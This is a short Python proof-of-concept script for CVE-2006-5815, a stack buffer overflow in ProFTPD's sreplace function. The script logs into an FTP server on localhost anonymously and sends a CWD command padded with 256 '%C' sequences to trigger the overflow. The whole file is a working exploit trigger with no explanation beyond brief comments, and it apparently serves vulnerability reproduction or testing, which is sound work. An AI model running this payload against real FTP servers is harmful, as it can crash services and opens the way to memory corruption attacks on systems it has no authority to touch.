#!/usr/bin/env python3
"""
PoC: CVE-2006-5815 - ProFTPD sreplace Stack Buffer Overflow
Trigger: Send CWD with long path containing many %C patterns to overflow sreplace buffer
"""

import socket

s = socket.socket()
s.connect(("localhost", 2128))
s.recv(1024)  # banner

# Login
s.send(b"USER anonymous\r\n")
s.recv(1024)
s.send(b"PASS test@test.com\r\n")
s.recv(1024)

# CVE-2006-5815: sreplace has stack buffer overflow on %C expansion
# Sending many %C patterns triggers the overflow
payload = b"CWD " + b"%C" * 256 + b"\r\n"
s.send(payload)
s.recv(1024)
s.close()
